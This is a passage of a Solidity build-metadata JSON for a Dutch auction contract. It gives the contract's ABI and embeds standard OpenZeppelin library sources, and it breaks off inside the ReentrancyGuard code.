startAuctionEvent\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timeElapsed\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"currentprice\",\"type\":\"uint256\"}],\"name\":\"updateCurrentPriceEvent\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"addBidder\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"bidder\",\"type\":\"uint256\"}],\"name\":\"balanceOfBidder\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"biddersList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"bidderID\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"walletAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"bidValue\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalAlgosPurchased\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"refundEth\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"isExist\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"calculate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"endAuction\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getAuctionState\",\"outputs\":[{\"internalType\":\"enum Dutch_Auction.AuctionState\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"refundETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"bidder\",\"type\":\"uint256\"}],\"name\":\"retrieveBidderAlgos\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"bidder\",\"type\":\"uint256\"}],\"name\":\"retrieveBidderBidValue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"retrieveContractBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"retrieveContractOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"retrieveCurrentPrice\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"bidder\",\"type\":\"uint256\"}],\"name\":\"retrieveRefund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"retrieveReservePrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"retrieveTotalAlgos\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"retrieveTotalBidder\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sendTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_totalAlgosAvailable\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_changePerMin\",\"type\":\"uint256\"}],\"name\":\"startAuction\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"updateCurrentPrice\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"events\":{\"startAuctionEvent(uint256,address,uint256,uint256)\":{\"notice\":\"Events\"}},\"kind\":\"user\",\"methods\":{\"addBidder()\":{\"notice\":\"public functions \"},\"retrieveTotalAlgos()\":{\"notice\":\"View and Pure Function \"}},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Dutch_Auction.sol\":\"Dutch_Auction\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Standard ERC20 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\\n */\\ninterface IERC20Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC20InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC20InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender`\\u2019s `allowance`. Used in transfers.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\\n     * @param needed Minimum amount required to perform a transfer.\\n     */\\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC20InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC20InvalidSpender(address spender);\\n}\\n\\n/**\\n * @dev Standard ERC721 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\\n */\\ninterface IERC721Errors {\\n    /**\\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\\n     * Used in balance queries.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721InvalidOwner(address owner);\\n\\n    /**\\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721NonexistentToken(uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param tokenId Identifier number of a token.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC721InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC721InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC721InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC721InvalidOperator(address operator);\\n}\\n\\n/**\\n * @dev Standard ERC1155 Errors\\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\\n */\\ninterface IERC1155Errors {\\n    /**\\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     * @param balance Current balance for the interacting account.\\n     * @param needed Minimum amount required to perform a transfer.\\n     * @param tokenId Identifier number of a token.\\n     */\\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\\n\\n    /**\\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\\n     * @param sender Address whose tokens are being transferred.\\n     */\\n    error ERC1155InvalidSender(address sender);\\n\\n    /**\\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\\n     * @param receiver Address to which tokens are being transferred.\\n     */\\n    error ERC1155InvalidReceiver(address receiver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator`\\u2019s approval. Used in transfers.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     * @param owner Address of the current owner of a token.\\n     */\\n    error ERC1155MissingApprovalForAll(address operator, address owner);\\n\\n    /**\\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\\n     * @param approver Address initiating an approval operation.\\n     */\\n    error ERC1155InvalidApprover(address approver);\\n\\n    /**\\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\\n     */\\n    error ERC1155InvalidOperator(address operator);\\n\\n    /**\\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\\n     * Used in batch transfers.\\n     * @param idsLength Length of the array of token identifiers\\n     * @param valuesLength Length of the array of token amounts\\n     */\\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\\n}\\n\",\"keccak256\":\"0x60c65f701957fdd6faea1acb0bb45825791d473693ed9ecb34726fdfaa849dd7\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"./IERC20.sol\\\";\\nimport {IERC20Metadata} from \\\"./extensions/IERC20Metadata.sol\\\";\\nimport {Context} from \\\"../../utils/Context.sol\\\";\\nimport {IERC20Errors} from \\\"../../interfaces/draft-IERC6093.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC20} interface.\\n *\\n * This implementation is agnostic to the way tokens are created. This means\\n * that a supply mechanism has to be added in a derived contract using {_mint}.\\n *\\n * TIP: For a detailed writeup see our guide\\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\\n * to implement supply mechanisms].\\n *\\n * The default value of {decimals} is 18. To change this, you should override\\n * this function so it returns a different value.\\n *\\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\\n * instead returning `false` on failure. This behavior is nonetheless\\n * conventional and does not conflict with the expectations of ERC20\\n * applications.\\n *\\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\\n * This allows applications to reconstruct the allowance for all accounts just\\n * by listening to said events. Other implementations of the EIP may not emit\\n * these events, as it isn't required by the specification.\\n */\\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\\n    mapping(address account => uint256) private _balances;\\n\\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\\n\\n    uint256 private _totalSupply;\\n\\n    string private _name;\\n    string private _symbol;\\n\\n    /**\\n     * @dev Sets the values for {name} and {symbol}.\\n     *\\n     * All two of these values are immutable: they can only be set once during\\n     * construction.\\n     */\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() public view virtual returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\n     * name.\\n     */\\n    function symbol() public view virtual returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    /**\\n     * @dev Returns the number of decimals used to get its user representation.\\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\\n     *\\n     * Tokens usually opt for a value of 18, imitating the relationship between\\n     * Ether and Wei. This is the default value returned by this function, unless\\n     * it's overridden.\\n     *\\n     * NOTE: This information is only used for _display_ purposes: it in\\n     * no way affects any of the arithmetic of the contract, including\\n     * {IERC20-balanceOf} and {IERC20-transfer}.\\n     */\\n    function decimals() public view virtual returns (uint8) {\\n        return 18;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view virtual returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address account) public view virtual returns (uint256) {\\n        return _balances[account];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transfer}.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - the caller must have a balance of at least `value`.\\n     */\\n    function transfer(address to, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-approve}.\\n     *\\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\\n     *\\n     * Requirements:\\n     *\\n     * - `spender` cannot be the zero address.\\n     */\\n    function approve(address spender, uint256 value) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transferFrom}.\\n     *\\n     * Emits an {Approval} event indicating the updated allowance. This is not\\n     * required by the EIP. See the note at the beginning of {ERC20}.\\n     *\\n     * NOTE: Does not update the allowance if the current allowance\\n     * is the maximum `uint256`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` and `to` cannot be the zero address.\\n     * - `from` must have a balance of at least `value`.\\n     * - the caller must have allowance for ``from``'s tokens of at least\\n     * `value`.\\n     */\\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\\n        address spender = _msgSender();\\n        _spendAllowance(from, spender, value);\\n        _transfer(from, to, value);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\\n     *\\n     * This internal function is equivalent to {transfer}, and can be used to\\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\\n     *\\n     * Emits a {Transfer} event.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _transfer(address from, address to, uint256 value) internal {\\n        if (from == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        if (to == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\\n     * this function.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function _update(address from, address to, uint256 value) internal virtual {\\n        if (from == address(0)) {\\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\\n            _totalSupply += value;\\n        } else {\\n            uint256 fromBalance = _balances[from];\\n            if (fromBalance < value) {\\n                revert ERC20InsufficientBalance(from, fromBalance, value);\\n            }\\n            unchecked {\\n                // Overflow not possible: value <= fromBalance <= totalSupply.\\n                _balances[from] = fromBalance - value;\\n            }\\n        }\\n\\n        if (to == address(0)) {\\n            unchecked {\\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\\n                _totalSupply -= value;\\n            }\\n        } else {\\n            unchecked {\\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\\n                _balances[to] += value;\\n            }\\n        }\\n\\n        emit Transfer(from, to, value);\\n    }\\n\\n    /**\\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\\n     * Relies on the `_update` mechanism\\n     *\\n     * Emits a {Transfer} event with `from` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\\n     */\\n    function _mint(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidReceiver(address(0));\\n        }\\n        _update(address(0), account, value);\\n    }\\n\\n    /**\\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\\n     * Relies on the `_update` mechanism.\\n     *\\n     * Emits a {Transfer} event with `to` set to the zero address.\\n     *\\n     * NOTE: This function is not virtual, {_update} should be overridden instead\\n     */\\n    function _burn(address account, uint256 value) internal {\\n        if (account == address(0)) {\\n            revert ERC20InvalidSender(address(0));\\n        }\\n        _update(account, address(0), value);\\n    }\\n\\n    /**\\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\\n     *\\n     * This internal function is equivalent to `approve`, and can be used to\\n     * e.g. set automatic allowances for certain subsystems, etc.\\n     *\\n     * Emits an {Approval} event.\\n     *\\n     * Requirements:\\n     *\\n     * - `owner` cannot be the zero address.\\n     * - `spender` cannot be the zero address.\\n     *\\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\\n     */\\n    function _approve(address owner, address spender, uint256 value) internal {\\n        _approve(owner, spender, value, true);\\n    }\\n\\n    /**\\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\\n     *\\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\\n     * `Approval` event during `transferFrom` operations.\\n     *\\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\\n     * true using the following override:\\n     * ```\\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\\n     *     super._approve(owner, spender, value, true);\\n     * }\\n     * ```\\n     *\\n     * Requirements are the same as {_approve}.\\n     */\\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\\n        if (owner == address(0)) {\\n            revert ERC20InvalidApprover(address(0));\\n        }\\n        if (spender == address(0)) {\\n            revert ERC20InvalidSpender(address(0));\\n        }\\n        _allowances[owner][spender] = value;\\n        if (emitEvent) {\\n            emit Approval(owner, spender, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\\n     *\\n     * Does not update the allowance value in case of infinite allowance.\\n     * Revert if not enough allowance is available.\\n     *\\n     * Does not emit an {Approval} event.\\n     */\\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\\n        uint256 currentAllowance = allowance(owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            if (currentAllowance < value) {\\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\\n            }\\n            unchecked {\\n                _approve(owner, spender, currentAllowance - value, false);\\n            }\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xc3e1fa9d1987f8d349dfb4d6fe93bf2ca014b52ba335cfac30bfe71e357e6f80\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\",\"keccak256\":\"0xc6a8ff0ea489379b61faa647490411b80102578440ab9d84e9a957cc12164e70\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {IERC20} from \\\"../IERC20.sol\\\";\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\",\"keccak256\":\"0xaa761817f6cd7892fcf158b3c776b34551cde36f48ff9703d53898bc45a94ea2\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0x75a4ee64c68dbd5f38bddd06e664a64c8271b4caa554fb6f0607dfd672bb4bf3\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/ReentrancyGuard.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/ReentrancyGuard.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Contract module that helps prevent reentrant calls to a function.\\n *\\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\\n * available, which can be applied to functions to make sure there are no nested\\n * (reentrant) calls to them.\\n *\\n * Note that because there is a single `nonReentrant` guard, functions marked as\\n * `nonReentrant` may not call one another. This can be worked around by making\\n * those functions `private`, and then adding `external` `nonReentrant` entry\\n * points to them.\\n *\\n * TIP: If you would like to learn more about reentrancy and alternative ways\\n * to protect against it, check out our blog post\\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\\n */\\nabstract contract ReentrancyGuard {\\n    // Booleans are more expensive than uint256 or any type that takes up a full\\n    // word because each write operation emits an extra SLOAD to first read the\\n    // slot's contents, replace the bits taken up by the boolean, and then write\\n    // back. This is the compiler's defense against contract upgrades and\\n    // pointer aliasing, and it cannot be disabled.\\n\\n    // The values being non-zero value makes deployment a bit more expensive,\\n    // but in exchange the refund on every call to nonReentrant will be lower in\\n    // amount. Since refunds are capped to a percentage of the total\\n    // transaction's gas, it is best to keep them low in cases like this one, to\\n    // increase the likelihood of the full refund coming into effect.\\n    uint256 private constant NOT_ENTERED = 1;\\n    uint256 private constant ENTERED = 2;\\n\\n    uint256 private _status;\\n\\n    /**\\n     * @dev Unauthorized reentrant call.\\n     */\\n    error ReentrancyGuardReentrantCall();\\n\\n    constructor() {\\n        _status = NOT_ENTERED;\\n    }\\n\\n    /**\\n     * @dev Prevents a contract from calling itself, directly or indirectly.\\n     * Calling a `nonReentrant` function from another `nonReentrant`\\n     * function is not supported. It is possible to prevent this from happening\\n     * by making the `nonReentrant` function external, and making it call a\\n     * `private` function that does the actual work.\\n     */\\n    modifier nonReentrant() {\\n        _nonReentrantBefore();\\n        _;\\n        _nonReentrantAfter();\\n    }\\n\\n    function _nonReentrantBefore() private {\\n        // On the first call to nonReentrant, _status will 